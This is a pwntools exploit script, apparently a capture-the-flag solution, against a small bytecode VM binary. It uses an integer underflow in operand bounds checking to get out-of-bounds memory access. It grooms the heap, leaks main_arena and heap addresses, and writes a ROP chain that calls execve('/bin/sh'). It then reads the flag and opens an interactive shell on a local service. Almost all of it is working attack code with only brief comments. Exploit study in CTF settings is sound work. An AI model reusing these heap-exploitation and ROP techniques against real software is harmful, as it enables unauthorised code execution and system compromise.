#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chal')
libc = ELF(exe.libc.path) if exe.libc else None

IMM, REG, MEM = range(3)
ADD, SUB, MUL, MOV, BRK, OUT = range(6)

def operand_t(a): return p32(a[0])+p32(a[1], signed=True)
def ins_t(op, a, b=None):
  if op not in [BRK, OUT]: assert a[0] != IMM ; assert b != None
  return p32(op)+operand_t(a)+(operand_t(b) if b != None else b'\x00'*8)

'''
integer underflow resulting in large oob:
int32_t *get_operand_addr(state_t *state, operand_t *operand) {
  size_t idx = (size_t)operand->value;
...SNIP...
  if (operand->type == MEM && state->data &&
      (size_t)idx <= state->data_size - sizeof(int32_t)) return (int32_t *)&state->data[idx];
  return NULL;
}
'''

io = remote('localhost', 6009)

b  = b''

b += ins_t(BRK, [IMM, 1])
b += ins_t(BRK, [IMM, -1])

for i in range(9):
  b += ins_t(BRK, [IMM, 0xfc+i*0x10])
  b += ins_t(BRK, [IMM, -(0xfc+i*0x10)])

b += ins_t(BRK, [IMM, 1])
for i in range(9):
  d  = 0xc+((i*(2*0x100+(i-1)*0x10))//2)
  b += ins_t(MOV, [MEM, d], [IMM, 0xf0|1])
  b += ins_t(MOV, [MEM, d+0xf0], [IMM, 0x10*(i+1)|1])
b += ins_t(BRK, [IMM, -1])

for i in range(9):
  b += ins_t(BRK, [IMM, 0xfc+i*0x10])
  b += ins_t(BRK, [IMM, -(0xfc+i*0x10)])

b += ins_t(BRK, [IMM, 1])

b += ins_t(MOV, [REG, 0xf], [MEM, 0x10])
b += ins_t(SUB, [REG, 0xf], [IMM, 1])
b += ins_t(MUL, [REG, 0xf], [IMM, 1<<12])

b += ins_t(MOV, [REG, 0xe], [MEM, 0x10+0x850])
b += ins_t(SUB, [REG, 0xe], [IMM, exe.sym.main_arena+0xb0])

for i in range(7): b += ins_t(MOV, [MEM, 0xc+((i*(2*0x100+(i-1)*0x10))//2)], [IMM, 0x100+i*0x10|1])

b += ins_t(BRK, [IMM, -1])

for _ in range(7):
  b += ins_t(BRK, [IMM, 0xec])
  b += ins_t(BRK, [IMM, -0xec])

b += ins_t(BRK, [IMM, 0xfc])
b += ins_t(MOV, [REG, 0x0], [REG, 0xf])
b += ins_t(ADD, [REG, 0x0], [IMM, 0x1228])

for i in range(5):
  b += ins_t(ADD, [REG, 0x0], [IMM, 0x10])
  if i == 4:
    b += ins_t(MOV, [REG, 0x0], [REG, 0xf])
    b += ins_t(ADD, [REG, 0x0], [IMM, 0x1118])
  b += ins_t(MOV, [MEM, 0x8+0x10*i+0xc], [REG, 0x0])

b += ins_t(BRK, [IMM, -0xfc])

b += ins_t(BRK, [IMM, 1])

b += ins_t(MOV, [REG, 0x0], [REG, 0xf])
b += ins_t(ADD, [REG, 0x0], [IMM, 0x1228])
b += ins_t(MOV, [MEM, 0x9c8+0xc], [REG, 0x0])

b += ins_t(MOV, [REG, 0x0], [REG, 0xe])
b += ins_t(ADD, [REG, 0x0], [IMM, exe.sym.main_arena+0xb0+0x4])
b += ins_t(MOV, [REG, 0xc6+3], [REG, 0x0])

b += ins_t(BRK, [IMM, -1])

b += ins_t(BRK, [IMM, 0xec-1])
b += ins_t(MOV, [MEM, 0xe4], [IMM, 0])
b += ins_t(BRK, [IMM, 1])

b += ins_t(MOV, [MEM, 0xe0], [IMM, 1])
b += ins_t(MOV, [MEM, 0xe4], [REG, 0xf])

b += ins_t(MOV, [REG, 0xd], [MEM, 0x390])
b += ins_t(SUB, [REG, 0xd], [IMM, 0x570])

b += ins_t(MOV, [REG, 0xc], [MEM, 0x3fc])
b += ins_t(SUB, [REG, 0xc], [IMM, 0x98])

b += ins_t(MOV, [REG, 0x0], [REG, 0xe])
b += ins_t(ADD, [REG, 0x0], [IMM, next(exe.search(b'/bin/sh\x00'))])
b += ins_t(MOV, [MEM, 0x1000], [REG, 0x0])
b += ins_t(MOV, [MEM, 0x1004], [IMM, 0x0])

b += ins_t(MOV, [MEM, 0x1204], [REG, 0xc])

'''
chal:
0x00076c6f: add esp, 0x2c; ret;
0x00035d4e: xchg ecx, eax; mov eax, esi; pop ebx; pop esi; pop edi; ret;
0x000779f6: pop ebx; ret;
0x000641e3: xchg edx, eax; ret;
0x00071f9a: pop eax; ret;
0x000779f7: ret;

vdso:
0x000005a5: int 0x80;
'''
rop = [
  (0xe, 0x71f9a), (0xf, 0x1000),
  (0xe, 0x35d4e), (0xe, next(exe.search(b'/bin/sh\x00'))), 0, 0,
  (0xe, 0x71f9a), 0,
  (0xe, 0x641e3),
  (0xe, 0x71f9a), int(constants.SYS_execve),
  (0xd, 0x5a5)
]

for i, g in enumerate(rop):
  if type(g) == type(()):
    b += ins_t(MOV, [REG, 0x0], [REG, g[0]])
    b += ins_t(ADD, [REG, 0x0], [IMM, g[1]])
    b += ins_t(MOV, [MEM, 0x30+0x4*i], [REG, 0x0])
  else: b += ins_t(MOV, [MEM, 0x30+0x4*i], [IMM, g])

b += ins_t(MOV, [REG, 0x0], [REG, 0xe])
b += ins_t(ADD, [REG, 0x0], [IMM, 0x76c6f])
b += ins_t(MOV, [MEM, 0x0], [REG, 0])

assert b'\n' != b
io.sendafter(b'> ', b.ljust(0x14000, b'\x00'))

io.sendline(b'cat flag.*')
log.success(io.recvuntil(b'}').split(b'\n')[-1].decode())
io.interactive()

